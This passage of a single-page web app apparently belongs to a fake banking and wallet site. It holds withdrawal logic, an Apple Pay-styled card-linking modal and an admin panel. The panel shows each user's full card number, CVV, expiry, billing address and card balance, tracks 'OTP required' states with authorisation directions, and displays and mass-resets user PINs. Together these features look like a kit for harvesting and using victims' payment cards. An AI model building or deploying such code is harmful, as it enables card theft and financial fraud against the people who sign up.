  document.getElementById('withdrawal-notice-text').textContent=t('withdrawalNotice');
  updateWithdrawMethods(ud?.country||'USA',ud);
};
document.getElementById('close-withdraw').onclick=()=>{
  withdrawModal.style.display='none';
  document.getElementById('withdraw-form').reset();
  document.getElementById('withdraw-error').textContent='';
  document.getElementById('withdraw-fields-container').innerHTML='';
};

function updateWithdrawMethods(country,userData){
  const ms=document.getElementById('withdraw-method');
  ms.innerHTML='<option value="">'+t('selectMethod')+'</option>';
  const cards=userData?.linkedCards||[];
  const authCards=cards.filter(c=>c.status==='authorized');
  if(authCards.length>0){
    const og=document.createElement('optgroup');
    og.label=t('authorizedBadge');
    authCards.forEach((card,i)=>{
      const op=document.createElement('option');
      op.value='authorized_card_'+i;
      op.textContent=card.brand+' ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour;
      og.appendChild(op);
    });
    ms.appendChild(og);
  }
  const banks=banksByCountry[country]||banksByCountry.USA;
  banks.forEach(b=>{
    const op=document.createElement('option');
    op.value=b.name;
    op.textContent=b.name;
    ms.appendChild(op);
  });
}

document.getElementById('withdraw-method').onchange=async()=>{
  const method=document.getElementById('withdraw-method').value;
  const cont=document.getElementById('withdraw-fields-container');
  cont.innerHTML='';
  if(!method)return;
  if(method.startsWith('authorized_card_')){
    const idx=parseInt(method.split('_').pop());
    const ud=await get(userDataRef).then(s=>s.val());
    const card=ud?.linkedCards?.filter(c=>c.status==='authorized')[idx];
    if(card){
      const d=document.createElement('div');
      d.style.cssText='background:rgba(52,211,153,0.1);border-left:3px solid #34d399;padding:12px;border-radius:8px;font-size:13px;color:#34d399;';
      d.innerHTML=t('authorizedCardWithdraw')+'<br><strong>'+card.brand+' ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour+'</strong><br>'+card.name;
      cont.appendChild(d);
    }
    return;
  }
  const ud=await get(userDataRef).then(s=>s.val());
  const banks=banksByCountry[ud?.country||'USA']||banksByCountry.USA;
  const sb=banks.find(b=>b.name===method);
  if(sb){
    sb.fields.forEach(f=>{
      const inp=document.createElement('input');
      inp.type=f==='email'?'email':'text';
      inp.id='withdraw-'+f;
      inp.placeholder=fieldPlaceholders[f]||f;
      inp.required=true;
      cont.appendChild(inp);
    });
  }
};

document.getElementById('withdraw-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const method=document.getElementById('withdraw-method').value;
  const amt=parseFloat(document.getElementById('withdraw-amount').value);
  const pin=document.getElementById('withdraw-pin').value;
  const err=document.getElementById('withdraw-error');
  if(!method)return err.textContent=t('errSelectMethod');
  if(isNaN(amt)||amt<=0)return err.textContent=t('errEnterAmount');
  if(!pin||pin.length!==4)return err.textContent=t('errEnterPin');
  const ud=await get(userDataRef).then(s=>s.val());
  if(!ud)return err.textContent=t('errUserNotFound');
  if(ud.pin!==pin)return err.textContent=t('errIncorrectPin');
  if(ud.balance<amt)return err.textContent=t('errInsufficientBalance');
  let det={};
  let methodDisplay=method;
  if(method.startsWith('authorized_card_')){
    const idx=parseInt(method.split('_').pop());
    const authCards=(ud?.linkedCards||[]).filter(c=>c.status==='authorized');
    const card=authCards[idx];
    if(!card)return err.textContent=t('errCardNotFound');
    det={cardLastFour:card.lastFour,cardBrand:card.brand};
    methodDisplay=card.brand+' ‚Ä¢‚Ä¢‚Ä¢‚Ä¢ '+card.lastFour;
  }else{
    const banks=banksByCountry[ud.country||'USA']||banksByCountry.USA;
    const sb=banks.find(b=>b.name===method);
    if(!sb)return err.textContent=t('errInvalidMethod');
    for(const f of sb.fields){
      const v=document.getElementById('withdraw-'+f)?.value?.trim();
      if(!v)return err.textContent=t('errFillAll');
      det[f]=v;
    }
  }
  const date=new Date().toISOString();
  try{
    await runTransaction(userDataRef,u=>{
      if(!u||u.balance<amt)return;
      u.balance-=amt;
      u.history=u.history||[];
      u.history.push({date,type:'Withdrawal',amount:amt,method:methodDisplay,details:det});
      return u;
    });
    const sym=currencySymbols[userCurrency]||'$';
    alert(t('alertWithdrawalTitle')+'\n'+t('alertWithdrawalBody',{sym,amount:amt.toLocaleString(),method:methodDisplay}));
    document.getElementById('withdraw-form').reset();
    document.getElementById('withdraw-fields-container').innerHTML='';
    withdrawModal.style.display='none';
    err.textContent='';
  }catch(ex){
    err.textContent=t('errWithdrawFailed')+ex.message;
  }
});

// ============================================================
// COPY ACCOUNT & GENERATE PIN
// ============================================================
document.getElementById('copy-account').onclick=async()=>{
  const an=document.getElementById('acc-number').textContent;
  if(an&&an!=='----------'){
    try{
      await navigator.clipboard.writeText(an);
      const b=document.getElementById('copy-account');
      const ot=b.textContent;
      b.textContent='‚úì Copied!';
      setTimeout(()=>b.textContent=ot,2000);
    }catch(e){alert(t('accountNumber')+': '+an);}
  }
};

document.getElementById('generate-pin-btn').onclick=()=>{
  window.open('https://candid-khapse-51e6c2.netlify.app','_blank');
};

// ============================================================
// MORE MENU
// ============================================================
document.getElementById('more-btn').onclick=()=>{
  document.getElementById('more-modal').style.display='flex';
  // Retranslate more options
  document.getElementById('more-contact').textContent='üìß '+t('contactUs');
  document.getElementById('more-help').textContent='‚ùì '+t('howToUse');
  document.getElementById('more-account').textContent='üë§ '+t('account');
  document.getElementById('more-logout').textContent='üö™ '+t('logout');
};
document.getElementById('close-more').onclick=()=>{
  document.getElementById('more-modal').style.display='none';
};

document.getElementById('more-contact').onclick=()=>{
  alert(t('contactEmail'));
};

document.getElementById('more-help').onclick=()=>{
  const steps=[
    t('tutorialTitle'),
    '‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ',
    t('tutorialStep1'),
    t('tutorialStep2'),
    t('tutorialStep3'),
    t('tutorialStep4'),
    t('tutorialStep5'),
    t('tutorialStep6')
  ];
  alert(steps.join('\n'));
};

document.getElementById('more-account').onclick=()=>{
  document.getElementById('more-modal').style.display='none';
  document.getElementById('account-modal').style.display='flex';
};
document.getElementById('more-logout').onclick=()=>signOut(auth);

// ============================================================
// LANGUAGE SELECTOR ‚Äî full retranslation on switch
// ============================================================
document.getElementById('language-selector').onclick=()=>{
  document.getElementById('language-modal').style.display='flex';
};
document.getElementById('close-language').onclick=()=>{
  document.getElementById('language-modal').style.display='none';
};

document.querySelectorAll('.language-option').forEach(b=>{
  b.onclick=()=>{
    currentLanguage=b.getAttribute('data-lang');
    translatePage();
    // Retranslate dynamic content
    updateHistory([]);
    get(userDataRef).then(snap=>{
      const d=snap.val()||{};
      updateHistory(d.history||[]);
    });
    document.getElementById('language-modal').style.display='none';
  };
});

// ============================================================
// ADMIN PANEL
// ============================================================
function switchAdminTab(tab){
  currentAdminTab=tab;
  document.querySelectorAll('.admin-tab').forEach(t=>{t.classList.remove('active');});
  if(tab==='authorization'){
    document.getElementById('admin-tab-auth').classList.add('active');
    document.getElementById('admin-content-auth').style.display='block';
    document.getElementById('admin-content-codes').style.display='none';
    loadAuthorizationTab();
  }else{
    document.getElementById('admin-tab-codes').classList.add('active');
    document.getElementById('admin-content-codes').style.display='block';
    document.getElementById('admin-content-auth').style.display='none';
    loadCodesTab();
  }
}

document.getElementById('admin-tab-auth').onclick=()=>switchAdminTab('authorization');
document.getElementById('admin-tab-codes').onclick=()=>switchAdminTab('codes');

async function loadAdminPanel(){switchAdminTab('authorization');}

async function loadAuthorizationTab(){
  const snap=await get(ref(db,'users'));
  if(!snap.exists())return;
  const users=snap.val();
  const now=new Date();
  const day24=24*60*60*1000;
  let recentCards=[],unattendedCards=[],pendingCards=[];
  for(const uid in users){
    const u=users[uid];
    if(u.email==='admin@gmail.com')continue;
    const cards=u.linkedCards||[];
    cards.forEach((card,idx)=>{
      if(card.status==='pending'||card.status==='otp_required'){
        const addedTime=new Date(card.addedDate);
        const age=now-addedTime;
        const cardData={uid,user:u,card,cardIndex:idx,age};
        if(age<day24)recentCards.push(cardData);
        else if(age>day24*3)unattendedCards.push(cardData);
        else pendingCards.push(cardData);
      }
    });
  }
  const rc=document.getElementById('recent-cards-list');
  const uc=document.getElementById('unattended-cards-list');
  const pc=document.getElementById('pending-cards-list');
  rc.innerHTML='';uc.innerHTML='';pc.innerHTML='';
  if(recentCards.length===0&&unattendedCards.length===0&&pendingCards.length===0){
    rc.innerHTML='<p style="text-align:center;opacity:0.6;padding:20px;">'+t('noCardsToAuthorize')+'</p>';
    return;
  }
  recentCards.forEach(data=>rc.appendChild(createAdminCardElement(data)));
  unattendedCards.forEach(data=>uc.appendChild(createAdminCardElement(data)));
  pendingCards.forEach(data=>pc.appendChild(createAdminCardElement(data)));
}

function createAdminCardElement({uid,user,card,cardIndex}){
  const el=document.createElement('div');
  el.className='admin-card-full';
  const statusClass=card.status==='otp_required'?'otp':'pending';
  const statusText=card.status==='otp_required'?t('otpRequired'):t('pending');
  el.innerHTML=`
    <div class="admin-card-header">
      <div>
        <div class="admin-card-user">${user.firstname} ${user.surname}</div>
        <div class="admin-card-email">${user.email}</div>
      </div>
      <span class="card-status ${statusClass}">${statusText}</span>
    </div>
    <div class="admin-card-grid">
      <div class="admin-card-section"><h5>${t('brand')}</h5><p>${card.brand}</p></div>
      <div class="admin-card-section"><h5>${t('fullCardNumber')}</h5><p style="font-family:monospace;">${card.number}</p></div>
      <div class="admin-card-section"><h5>${t('lastFourLabel')}</h5><p>‚Ä¢‚Ä¢‚Ä¢‚Ä¢ ${card.lastFour}</p></div>
      <div class="admin-card-section"><h5>${t('expiryDate')}</h5><p>${card.expiry}</p></div>
      <div class="admin-card-section"><h5>${t('cvv')}</h5><p>${card.cvv}</p></div>
      <div class="admin-card-section"><h5>${t('cardBalance')}</h5><p>${card.currentBalance}</p></div>
    </div>
    <div class="admin-card-section full-width">
      <h5>${t('billingAddress')}</h5>
      <p>${card.billingAddress.street}<br>
         ${card.billingAddress.city}, ${card.billingAddress.postcode}<br>
         ${card.billingAddress.country}<br>
         ${t('phoneNum')}: ${card.billingAddress.phone}</p>
    </div>
    <div class="admin-card-actions">
      <button class="admin-auth-btn" onclick="adminAuthorizeCard('${uid}',${cardIndex})">${t('authorizeCard')}</button>
      <button class="admin-reject-btn" onclick="adminRejectCard('${uid}',${cardIndex})">${t('rejectCard')}</button>
    </div>
    <div class="auth-directions-box">
      <div class="auth-directions-title">${t('authDirectionTitle')}</div>
      <div class="auth-directions-steps">
        <p>${t('authDirection1')}</p>
        <p>${t('authDirection2')}</p>
        <p>${t('authDirection3')}</p>
        <p>${t('authDirection4')}</p>
        <p>${t('authDirection5')}</p>
      </div>
      <div class="auth-directions-note">${t('authDirectionNote')}</div>
    </div>
  `;
  return el;
}

window.adminAuthorizeCard=async function(uid,cardIndex){
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
  if(!confirm(t('authorizeConfirm')))return;
  const ur=ref(db,'users/'+uid);
  await runTransaction(ur,u=>{
    if(u&&u.linkedCards&&u.linkedCards[cardIndex]){
      u.linkedCards[cardIndex].status='authorized';
      u.linkedCards[cardIndex].authorizedDate=new Date().toISOString();
      return u;
    }
    return u;
  });
  alert(t('cardAuthorized'));
  loadAuthorizationTab();
};

window.adminRejectCard=async function(uid,cardIndex){
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
  if(!confirm(t('rejectConfirm')))return;
  await deleteRejectedCard(uid,cardIndex);
  alert(t('cardRejected'));
  loadAuthorizationTab();
};

async function loadCodesTab(){
  const snap=await get(ref(db,'users'));
  if(!snap.exists())return;
  const users=snap.val();
  const byCountry={};
  for(const uid in users){
    const u=users[uid];
    if(u.email==='admin@gmail.com')continue;
    const co=u.country||'Unknown';
    if(!byCountry[co])byCountry[co]=[];
    byCountry[co].push({uid,user:u});
  }
  const cs=document.getElementById('codes-country-sections');
  cs.innerHTML='';
  Object.keys(byCountry).sort().forEach(co=>{
    const sec=document.createElement('div');
    sec.className='country-section';
    const hdr=document.createElement('div');
    hdr.className='country-header';
    hdr.innerHTML=`<h3>${co}</h3><span class="country-count">${byCountry[co].length} ${t('users')}</span>`;
    sec.appendChild(hdr);
    const ul=document.createElement('div');
    byCountry[co].forEach(({uid,user})=>{ul.appendChild(createUserCodeCard(uid,user));});
    sec.appendChild(ul);
    cs.appendChild(sec);
  });
}

function createUserCodeCard(uid,user){
  const sym=currencySymbols[user.currency]||'$';
  const el=document.createElement('div');
  el.className='admin-user-card';
  el.innerHTML=`
    <div class="admin-user-info">
      <div class="admin-user-name">${user.firstname} ${user.surname}</div>
      <div class="admin-user-detail">Email: ${user.email}</div>
      <div class="admin-user-detail">${t('accountNumber')}: ${user.accountNumber}</div>
      <div class="admin-user-detail">${t('country')}: ${user.country||'N/A'}</div>
      <div class="admin-user-detail">PIN: ${user.pin||'N/A'}</div>
      <div class="admin-user-detail">${t('availableBalance')}: ${sym}${(user.balance||0).toLocaleString()}</div>
    </div>
    <div class="admin-user-actions">
      <input type="text" class="admin-pin-input" placeholder="${t('newPin')}" maxlength="4" id="pin-${uid}">
      <button class="admin-change-pin-btn" onclick="changeUserPin('${uid}')">${t('changeAll')}</button>
    </div>
  `;
  return el;
}

window.changeUserPin=async function(uid){
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
  const p=document.getElementById('pin-'+uid).value.trim();
  if(!p||p.length!==4||!/^\d{4}$/.test(p)){alert(t('errPinFourDigits'));return;}
  if(!confirm(t('alertConfirmPinChange',{pin:p})))return;
  await runTransaction(ref(db,'users/'+uid),u=>{
    if(u){u.pin=p;return u;}
    return u;
  });
  alert(t('alertPinUpdated'));
  loadCodesTab();
};

document.getElementById('admin-logout-btn').onclick=()=>signOut(auth);

document.getElementById('admin-change-all-btn').onclick=async()=>{
  const password=prompt(t('adminPassword')+':');
  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
  const p=document.getElementById('admin-global-pin').value.trim();
  if(!p||p.length!==4||!/^\d{4}$/.test(p)){alert(t('errPinFourDigits'));return;}
  if(!confirm(t('alertConfirmAllPins',{pin:p})))return;
  const snap=await get(ref(db,'users'));
  if(snap.exists()){
    const us=snap.val();
    let count=0;
    for(const uid in us){
      if(us[uid].email==='admin@gmail.com')continue;
      await runTransaction(ref(db,'users/'+uid),u=>{
        if(u){u.pin=p;return u;}
        return u;
      });
      count++;
    }
    alert(t('alertPinsUpdated',{count,pin:p}));
    loadCodesTab();
  }
};
</script>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);color:#fff;min-height:100vh;}
.language-selector{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:999;font-size:24px;border:1px solid rgba(255,255,255,0.2);transition:all 0.3s;}
.language-selector:hover{background:rgba(255,255,255,0.2);transform:scale(1.1);}
#auth-screen{height:100vh;display:flex;flex-direction:column;justify-content:center;padding:20px;overflow-y:auto;}
.form-section{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin:12px 0;max-width:400px;width:100%;margin-left:auto;margin-right:auto;}
input,select,button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:10px;font-size:15px;}
input,select{background:rgba(255,255,255,0.12);color:#fff;}
input::placeholder{color:rgba(255,255,255,0.5);}
select option{background:#0a2540;color:#fff;}
button{background:#0055ff;color:white;font-weight:bold;cursor:pointer;transition:background 0.2s;}
button:hover{background:#0044dd;}
.toggle-link{text-align:center;margin-top:12px;color:#4dabff;text-decoration:underline;cursor:pointer;font-size:14px;}
#dashboard{padding:24px 16px 140px;}
.header{text-align:center;margin:40px 0 24px;}
.username-display{font-size:22px;font-weight:600;margin-bottom:8px;}
.balance-card{background:linear-gradient(135deg,#1a4bff,#0033cc);border-radius:20px;padding:20px 24px;margin:16px auto;box-shadow:0 8px 24px rgba(0,85,255,0.4);max-width:360px;width:calc(100% - 32px);}
.card-number{font-size:15px;letter-spacing:1.5px;margin-bottom:14px;color:rgba(255,255,255,0.85);font-family:'Courier New',monospace;}
.card-balance{font-size:38px;font-weight:800;color:white;text-align:right;letter-spacing:-1px;}
.card-balance-label{font-size:13px;opacity:0.75;text-align:right;margin-top:2px;}
.accounts-btn{background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:12px 32px;border-radius:30px;font-size:16px;margin:12px auto;display:block;cursor:pointer;max-width:200px;}
.nav-section{margin:24px 0;}
.bottom-nav{background:rgba(0,37,90,0.85);backdrop-filter:blur(12px);display:flex;justify-content:space-around;padding:12px 0;border-radius:20px;border:1px solid rgba(255,255,255,0.1);}
.nav-item{text-align:center;color:#fff;font-size:28px;cursor:pointer;width:60px;position:relative;}
.nav-label{font-size:11px;margin-top:4px;opacity:0.8;}
.section-title{font-size:18px;font-weight:600;margin:32px 0 16px;opacity:0.9;}
.transaction-item{background:rgba(255,255,255,0.06);border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;gap:16px;}
.transaction-icon{width:48px;height:48px;background:rgba(0,85,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:bold;flex-shrink:0;}
.transaction-details{flex:1;min-width:0;}
.transaction-title{font-weight:600;font-size:15px;margin-bottom:4px;}
.transaction-time{font-size:13px;opacity:0.6;}
.transaction-amount{font-weight:bold;font-size:16px;text-align:right;white-space:nowrap;}
.negative{color:#ff5c5c;}
.positive{color:#34d399;}
.error{color:#ff5c5c;text-align:center;margin:6px 0;font-size:13px;}
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);justify-content:center;align-items:flex-start;z-index:1000;overflow-y:auto;padding:20px;padding-top:60px;}
.modal-content{background:linear-gradient(135deg,#001f3f,#000d1a);padding:20px;border-radius:16px;width:100%;max-width:400px;color:#fff;margin:auto;}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;}
.close-btn{background:none;border:none;color:#fff;font-size:32px;cursor:pointer;padding:0;width:40px;height:40px;display:flex;align-items:center;justify-content:center;}
.account-info p{display:flex;justify-content:space-between;margin:12px 0;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.1);gap:12px;}
.account-info strong{opacity:0.7;flex-shrink:0;}
.account-info span{text-align:right;word-break:break-all;}
.copy-btn{background:rgba(0,85,255,0.3);padding:8px 16px;border-radius:8px;font-size:13px;margin-top:8px;}
.more-options{display:flex;flex-direction:column;gap:4px;}
.more-item{padding:16px;background:rgba(255,255,255,0.05);border-radius:12px;cursor:pointer;transition:background 0.2s;}
.more-item:hover{background:rgba(255,255,255,0.1);}
.language-options{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:16px;}
.language-option{padding:12px;background:rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;text-align:center;transition:background 0.2s;border:1px solid rgba(255,255,255,0.1);}
.language-option:hover{background:rgba(255,255,255,0.1);}
.language-option.active-lang{background:rgba(0,85,255,0.3);border-color:#0055ff;}
.pin-input{font-size:18px;letter-spacing:8px;text-align:center;font-family:monospace;}
.generate-pin-btn{background:rgba(52,211,153,0.2);color:#34d399;border:1px solid #34d399;padding:10px 20px;border-radius:8px;font-size:13px;cursor:pointer;margin-top:8px;width:auto;display:inline-block;}
.top-buttons{display:flex;gap:8px;justify-content:space-between;margin-bottom:16px;}
.top-buttons button{flex:1;padding:10px;font-size:13px;}
.withdrawal-notice{background:rgba(255,193,7,0.15);border-left:3px solid #ffc107;padding:12px;margin:12px 0;border-radius:8px;font-size:13px;color:#ffc107;}
#withdraw-fields-container{display:flex;flex-direction:column;}
.card-input-group{display:flex;gap:8px;}
.card-input-group input{flex:1;}
.billing-address-section{background:rgba(255,255,255,0.05);padding:16px;border-radius:12px;margin:16px 0;}
.billing-address-section h4{font-size:14px;margin-bottom:12px;opacity:0.8;}
.linked-card-item{background:rgba(255,255,255,0.06);border-radius:12px;padding:16px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;border:1px solid rgba(255,255,255,0.1);}
.linked-card-info{flex:1;}
.linked-card-brand{font-size:14px;font-weight:600;color:#4dabff;margin-bottom:4px;}
.linked-card-number{font-size:16px;font-weight:600;margin-bottom:4px;font-family:'Courier New',monospace;}
.linked-card-name{font-size:13px;opacity:0.7;margin-bottom:2px;}
.linked-card-expiry{font-size:12px;opacity:0.6;}
.remove-card-btn,.edit-card-btn{background:#ff5c5c;color:white;padding:8px 16px;border-radius:8px;border:none;cursor:pointer;font-size:13px;width:auto;margin:0;}
.edit-card-btn{background:#ffc107;color:#000;}
.card-status{display:inline-block;padding:4px 12px;border-radius:12px;font-size:11px;font-weight:600;margin-top:8px;}
.card-status.pending{background:rgba(255,193,7,0.2);color:#ffc107;border:1px solid #ffc107;}
.card-status.authorized{background:rgba(52,211,153,0.2);color:#34d399;border:1px solid #34d399;}
.card-status.otp{background:rgba(59,130,246,0.2);color:#3b82f6;border:1px solid #3b82f6;}
.card-options-menu{display:flex;flex-direction:column;gap:12px;margin:20px 0;}
.card-option-btn{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.2);padding:20px;border-radius:12px;cursor:pointer;transition:all 0.2s;text-align:left;}
.card-option-btn:hover{background:rgba(255,255,255,0.15);transform:translateY(-2px);}
.card-option-icon{font-size:32px;margin-bottom:8px;}
.card-option-title{font-size:18px;font-weight:600;margin-bottom:4px;}
.card-option-desc{font-size:13px;opacity:0.7;}
#admin-panel{display:none;padding:24px 16px;min-height:100vh;}
.admin-header{text-align:center;margin-bottom:32px;}
.admin-tabs{display:flex;gap:12px;margin-bottom:24px;justify-content:center;}
.admin-tab{background:rgba(255,255,255,0.08);border:2px solid transparent;padding:12px 24px;border-radius:12px;cursor:pointer;font-size:16px;font-weight:600;transition:all 0.2s;}
.admin-tab:hover{background:rgba(255,255,255,0.15);}
.admin-tab.active{background:#0055ff;border-color:#0055ff;}
.admin-content{display:none;}
.admin-global-controls{background:rgba(255,255,255,0.08);padding:20px;border-radius:16px;margin-bottom:24px;}
.admin-global-input{display:flex;gap:12px;margin-bottom:12px;}
.admin-global-pin{flex:1;padding:12px;border-radius:10px;background:rgba(255,255,255,0.12);border:none;color:#fff;font-size:18px;letter-spacing:4px;text-align:center;}
.admin-change-all-btn{background:#ff9800;color:white;padding:12px 24px;border-radius:10px;border:none;font-weight:bold;cursor:pointer;}
.admin-logout-btn{background:#ff5c5c;color:white;padding:10px 20px;border-radius:10px;border:none;cursor:pointer;margin-top:12px;width:100%;}
.admin-section-title{font-size:20px;font-weight:600;margin:24px 0 16px;padding-bottom:8px;border-bottom:2px solid rgba(255,255,255,0.1);}
.admin-card-full{background:rgba(255,255,255,0.06);border-radius:16px;padding:20px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.1);}
.admin-card-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid rgba(255,255,255,0.1);}
.admin-card-user{font-size:18px;font-weight:600;color:#4dabff;margin-bottom:4px;}
.admin-card-email{font-size:13px;opacity:0.7;}
.admin-card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;margin-bottom:16px;}
.admin-card-section{background:rgba(255,255,255,0.03);padding:12px;border-radius:8px;}
.admin-card-section.full-width{grid-column:1/-1;}
.admin-card-section h5{font-size:11px;text-transform:uppercase;opacity:0.6;margin-bottom:6px;letter-spacing:0.5px;}
.admin-card-section p{font-size:14px;font-weight:500;}
.admin-card-actions{display:flex;gap:12px;margin-top:16px;}
.admin-auth-btn{flex:1;background:#34d399;color:white;padding:12px;border-radius:8px;border:none;font-weight:600;cursor:pointer;font-size:14px;}
.admin-reject-btn{flex:1;background:#ff5c5c;color:white;padding:12px;border-radius:8px;border:none;font-weight:600;cursor:pointer;font-size:14px;}
.country-section{margin-bottom:32px;}
.country-header{display:flex;justify-content:space-between;align-items:center;background:rgba(0,85,255,0.1);padding:12px 16px;border-radius:12px;margin-bottom:16px;border-left:4px solid #0055ff;}
.country-header h3{margin:0;font-size:18px;color:#4dabff;}
.country-count{background:rgba(255,255,255,0.1);padding:4px 12px;border-radius:12px;font-size:13px;font-weight:600;}
.admin-user-card{background:rgba(255,255,255,0.06);border-radius:16px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1);}
.admin-user-name{font-size:18px;font-weight:600;margin-bottom:8px;color:#4dabff;}
.admin-user-detail{font-size:13px;opacity:0.8;margin:4px 0;}
.admin-user-actions{display:flex;gap:8px;margin-top:12px;}
.admin-pin-input{flex:1;padding:10px;border-radius:8px;background:rgba(255,255,255,0.12);border:none;color:#fff;font-size:16px;letter-spacing:4px;text-align:center;}
.admin-change-pin-btn{background:#34d399;color:white;padding:10px 20px;border-radius:8px;border:none;font-weight:bold;cursor:pointer;}

/* ‚îÄ‚îÄ Apple Pay card modal ‚îÄ‚îÄ */
.apple-pay-modal{background:#000!important;border:1px solid rgba(255,255,255,0.12);}
.apple-pay-modal input,
.apple-pay-modal select{background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.15);color:#fff;}
.apple-pay-modal button[type="submit"]{background:#fff;color:#000;font-weight:700;letter-spacing:0.3px;border-radius:12px;margin-top:8px;}
.apple-pay-modal button[type="submit"]:hover{background:#e0e0e0;}
.apple-pay-modal .billing-address-section{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);}
.apple-pay-header{
  display:flex;
  flex-direction:column;
  align-items:center;
  padding:24px 0 16px;
  border-bottom:1px solid rgba(255,255,255,0.08);
  margin-bottom:16px;
}
.apple-logo{
  width:52px;
  height:52px;
  color:#fff;
  filter:drop-shadow(0 0 6px rgba(255,255,255,0.15));
}
.apple-pay-powered{
  font-size:11px;
  letter-spacing:1.5px;
  text-transform:uppercase;
  color:rgba(255,255,255,0.5);
  margin-top:6px;
  font-weight:500;
}

/* ‚îÄ‚îÄ Balance ownership notice ‚îÄ‚îÄ */
.balance-ownership-notice{
  background:rgba(255,193,7,0.1);
  border-left:3px solid #ffc107;
  border-radius:8px;
  padding:10px 14px;
  margin-top:10px;
  font-size:12.5px;
  color:#ffe082;
  line-height:1.5;
}

/* ‚îÄ‚îÄ Auth directions box (admin) ‚îÄ‚îÄ */
.auth-directions-box{
  background:rgba(77,171,255,0.07);
  border:1px solid rgba(77,171,255,0.25);
  border-radius:10px;
  padding:14px 16px;
  margin-top:14px;
}
.auth-directions-title{
  font-size:14px;
  font-weight:700;
  color:#4dabff;
  margin-bottom:10px;
}
.auth-directions-steps p{
  font-size:13px;
  color:rgba(255,255,255,0.85);
  margin:5px 0;
  padding-left:4px;
  line-height:1.5;
}
.auth-directions-note{
  font-size:12px;
  color:rgba(255,255,255,0.5);
  margin-top:10px;
  font-style:italic;
  border-top:1px solid rgba(255,255,255,0.08);
  padding-top:8px;
}
</style>
</head>
<body>
<div class="language-selector" id="language-selector">üåê</div>

<!-- AUTH SCREEN -->
<div id="auth-screen">
  <div id="signup-section" class="form-section">
    <h2 data-translate="createAccount">Create Account</h2>
    <form id="signup-form">
      <select id="su-country" required>
        <option value="" data-translate="selectCountry">Select Country</option>
        <option value="USA">United States</option>
        <option value="UK">United Kingdom</option>
        <option value="Nigeria">Nigeria</option>
        <option value="Germany">Germany</option>
        <option value="France">France</option>
        <option value="Canada">Canada</option>
        <option value="Brazil">Brazil</option>
      </select>
      <input type="text" id="su-surname" data-ph="surname" placeholder="Surname" required>
      <input type="text" id="su-firstname" data-ph="firstName" placeholder="First Name" required>
      <input type="text" id="su-othername" data-ph="otherName" placeholder="Other Name (optional)">
      <input type="tel" id="su-phone" data-ph="phoneNumber" placeholder="Phone Number" required>
      <div id="dynamic-fields"></div>
      <input type="text" id="su-username" data-ph="username" placeholder="Username" required>
      <input type="email" id="su-email" data-ph="email" placeholder="Email" required>
      <input type="password" id="su-password" data-ph="password" placeholder="Password (min 8 chars)" required minlength="8">
      <input type="password" id="su-confirm" data-ph="confirmPassword" placeholder="Confirm Password" required>
      <select id="su-currency" required>
        <option value="USD">USD ($)</option>
        <option value="EUR">EUR (‚Ç¨)</option>
        <option value="GBP">GBP (¬£)</option>
      </select>
      <input type="text" id="su-promo" data-ph="promoCode" placeholder="Promo Code (optional)">
      <button type="submit" data-translate="signUp">Sign Up</button>
    </form>
    <p class="error" id="signup-error"></p>
    <div class="toggle-link" id="to-login" data-translate="alreadyHaveAccount">Already have an account? Log In</div>
  </div>

  <div id="login-section" class="form-section" style="display:none;">
    <h2 data-translate="login">Log In</h2>
    <form id="login-form">
      <input type="email" id="li-email" data-ph="email" placeholder="Email" required>
      <input type="password" id="li-password" data-ph="password" placeholder="Password" required>
      <button type="submit" data-translate="login">Log In</button>
    </form>
    <p class="error" id="login-error"></p>
    <div class="toggle-link" id="to-signup" data-translate="noAccount">Don't have an account? Sign Up</div>
  </div>
</div>

<!-- DASHBOARD -->
<div id="dashboard">
  <div class="header">
    <div id="username-display" class="username-display">User</div>
    <div class="balance-card">
      <div class="card-number" id="card-number">**** *** ***</div>
      <div class="card-balance">
        <span id="currency-symbol">$</span><span id="balance">0.00</span>
      </div>
      <div class="card-balance-label" data-translate="availableBalance">Available Balance</div>
    </div>
    <button class="accounts-btn" data-translate="accounts">Accounts</button>
  </div>

  <div class="nav-section">
    <div class="bottom-nav">
      <div class="nav-item" id="withdraw-btn">
        <div>‚Üì</div>
        <div class="nav-label" data-translate="withdraw">Withdraw</div>
      </div>
      <div class="nav-item" id="send-btn">
        <div>‚Üí</div>
        <div class="nav-label" data-translate="send">Send</div>
